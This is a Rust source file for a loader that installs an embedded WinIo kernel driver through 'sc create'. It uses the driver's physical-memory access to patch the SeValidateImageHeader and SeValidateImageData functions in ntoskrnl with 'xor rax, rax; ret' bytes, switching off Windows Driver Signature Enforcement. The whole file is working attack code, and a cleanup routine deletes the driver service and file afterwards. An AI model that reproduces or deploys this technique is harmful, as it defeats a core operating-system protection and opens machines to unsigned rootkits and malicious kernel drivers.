use std::{
    env,
    fs::{self, File},
    io::Write,
    path::PathBuf,
    process::{Command, Stdio},
};

use memflow::{
    connector::mmap::MappedPhysicalMemory,
    mem::{CachedPhysicalMemory, CachedVirtualTranslate, DirectTranslate, MemoryView},
    os::Os,
    types::{cache::timed_validator::TimedCacheValidator, Address},
};
use memflow_vdm::VdmMapData;
use memflow_win32::{prelude::PdbSymbols, win32::Win32Kernel};
use memflow_winio::create_connector;

use thiserror::Error;

/// xor rax, rax
///
/// ret
const PATCH: [u8; 4] = [0x48, 0x31, 0xC0, 0xC3];

const SE_VALIDATE_IMAGE_HEADER_ORIGINAL: [u8; 4] = [0x48, 0x8B, 0xC4, 0x48];
const SE_VALIDATE_IMAGE_DATA_ORIGINAL: [u8; 4] = [0x48, 0x83, 0xEC, 0x48];

type Kernel = Win32Kernel<
    CachedPhysicalMemory<
        'static,
        MappedPhysicalMemory<&'static mut [u8], VdmMapData<'static>>,
        TimedCacheValidator,
    >,
    CachedVirtualTranslate<DirectTranslate, TimedCacheValidator>,
>;

pub struct WinIoLoader {
    kernel: Kernel,
    pub se_validate_image_header: Address,
    pub se_validate_image_data: Address,
    dse: bool,
    create_winio: bool,
}

impl WinIoLoader {
    pub fn new(create_winio: bool) -> Result<Self, Error> {
        if create_winio {
            let path = "./winio.sys";

            File::create(path)
                .and_then(|mut f| f.write_all(include_bytes!("../bin/winio.sys")))
                .map_err(|_| Error::Windows)?;

            Self::create_driver("WinIo", path)?;
        }

        let connector = create_connector(&Default::default()).map_err(|_| Error::Memflow)?;

        let mut kernel = Win32Kernel::builder(connector)
            .build_default_caches()
            .build()
            .map_err(|_| Error::Memflow)?;

        let ntoskrnl = kernel.info().base;

        let path =
            PathBuf::from(env::var("USERPROFILE").unwrap_or(String::from("C:\\Users\\Default")))
                .join("AppData")
                .join("Local")
                .join("memflow")
                .join("ntkrnlmp.pdb")
                .join(kernel.kernel_info.kernel_guid.clone().unwrap().guid);

        let symbols = PdbSymbols::new(&fs::read(path).map_err(|_| Error::Windows)?)
            .map_err(|_| Error::Memflow)?;

        let se_validate_image_header = Address::from(
            ntoskrnl
                + symbols
                    .find_symbol("SeValidateImageHeader")
                    .copied()
                    .ok_or(Error::NotFound)?,
        );

        let se_validate_image_data = Address::from(
            ntoskrnl
                + symbols
                    .find_symbol("SeValidateImageData")
                    .copied()
                    .ok_or(Error::NotFound)?,
        );

        let dse = {
            let mut read_raw = |a: Address| kernel.read_raw(a, 4).map_err(|_| Error::Memflow);

            // These should never have an mismatching state
            read_raw(se_validate_image_header)? == SE_VALIDATE_IMAGE_HEADER_ORIGINAL
                || read_raw(se_validate_image_data)? == SE_VALIDATE_IMAGE_DATA_ORIGINAL
        };

        Ok(Self {
            kernel,
            se_validate_image_header,
            se_validate_image_data,
            dse,
            create_winio,
        })
    }

    pub fn get_dse(&mut self) -> Result<bool, Error> {
        let mut read_raw = |a: Address| self.kernel.read_raw(a, 4).map_err(|_| Error::Memflow);

        // These should never have an mismatching state
        Ok(
            read_raw(self.se_validate_image_header)? == SE_VALIDATE_IMAGE_HEADER_ORIGINAL
                || read_raw(self.se_validate_image_data)? == SE_VALIDATE_IMAGE_DATA_ORIGINAL,
        )
    }

    /// Sets Driver Signature Enforcment based on `enabled`
    pub fn set_dse(&mut self, enabled: bool) -> Result<(), Error> {
        let mut write_raw =
            |a: Address, d: &[u8]| self.kernel.write_raw(a, d).map_err(|_| Error::Memflow);

        if enabled {
            write_raw(
                self.se_validate_image_header,
                &SE_VALIDATE_IMAGE_HEADER_ORIGINAL,
            )?;
            write_raw(
                self.se_validate_image_data,
                &SE_VALIDATE_IMAGE_DATA_ORIGINAL,
            )?;
        } else {
            write_raw(self.se_validate_image_header, &PATCH)?;
            write_raw(self.se_validate_image_data, &PATCH)?;
        }

        self.dse = enabled;

        Ok(())
    }

    /// Creates and starts a driver service, overwriting any existing one
    pub fn create_driver(name: &str, path: &str) -> Result<(), Error> {
        // Windows api just works worse than sc command T_T
        Command::new("cmd")
            .arg("/C")
            .arg(format!("sc stop {}", name))
            .stdout(Stdio::null())
            .stdin(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|_| Error::Windows)?
            .wait()
            .map_err(|_| Error::Windows)?;

        Command::new("cmd")
            .arg("/C")
            .arg(format!("sc delete {}", name))
            .stdout(Stdio::null())
            .stdin(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|_| Error::Windows)?
            .wait()
            .map_err(|_| Error::Windows)?;

        Command::new("cmd")
            .arg("/C")
            .arg(format!(
                "sc create {} type=kernel binPath={} && sc start {}",
                name,
                fs::canonicalize(path)
                    .map_err(|_| Error::Windows)?
                    .to_string_lossy(),
                name,
            ))
            .stdout(Stdio::null())
            .stdin(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|_| Error::Windows)?
            .wait()
            .map_err(|_| Error::Windows)?;

        Ok(())
    }
}

impl Drop for WinIoLoader {
    fn drop(&mut self) {
        if self.create_winio {
            let _ = Command::new("cmd")
                .arg("/C")
                .arg("timeout /t 10 >nul && sc stop WinIo && sc delete WinIo && del winio.sys")
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn();
        }
    }
}

#[derive(Error, Debug, Clone, PartialEq, Hash)]
pub enum Error {
    #[error("Windows error")]
    Windows,
    #[error("Memflow error")]
    Memflow,
    #[error("Not found")]
    NotFound,
}
